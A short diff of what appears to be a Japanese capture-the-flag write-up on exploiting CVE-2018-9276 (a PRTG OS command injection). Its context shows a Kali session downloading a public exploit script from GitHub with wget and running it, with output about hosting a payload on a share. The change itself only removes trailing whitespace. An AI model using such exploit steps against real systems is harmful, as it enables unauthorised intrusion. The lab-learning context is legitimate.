@@ -150,7 +150,7 @@ CVE-2018-9276のOSコマンドインジェクションでDLLをrundllで実行�
 ```sh
 └─$ wget https://raw.githubusercontent.com/A1vinSmith/CVE-2018-9276/refs/heads/main/exploit.py
 2025-04-18 02:21:33 URL:https://raw.githubusercontent.com/A1vinSmith/CVE-2018-9276/refs/heads/main/exploit.py [16049/16049] -> "exploit.py" [1]
-                                                                                                                                                                                                                          
+
 └─$ python3.13 exploit.py                                                                                                          
 /home/kali/htb/exploit.py:259: SyntaxWarning: invalid escape sequence '\{'
   print(event + "Hosting payload at [\\\\{}\{}]".format(lhost, shareName))
